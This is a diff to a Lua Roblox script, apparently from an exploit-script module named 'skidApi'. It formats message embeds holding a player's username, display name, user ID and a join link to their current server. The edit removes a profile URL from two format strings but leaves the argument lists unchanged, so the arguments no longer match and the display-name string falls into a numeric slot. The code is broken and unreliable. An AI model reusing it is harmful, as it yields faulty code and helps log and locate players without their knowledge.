@@ -44,7 +44,7 @@ do
                         ["fields"] = {
                             {
                             ["name"] = "Data",
-                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
+                            ["value"] = string.format('\nUsername: %s\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
                             ["name"] = "Personal",
@@ -110,7 +110,7 @@ do
                 ["fields"] = {
                     {
                     ["name"] = "Data",
-                    ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplay: %s\nID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
+                    ["value"] = string.format('\nUsername: %s\nDisplay: %s\nID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                     }
                 },
                 ["author"] = {
@@ -144,7 +144,6 @@ do
 
     return skidApi
 end
-
 
 
 
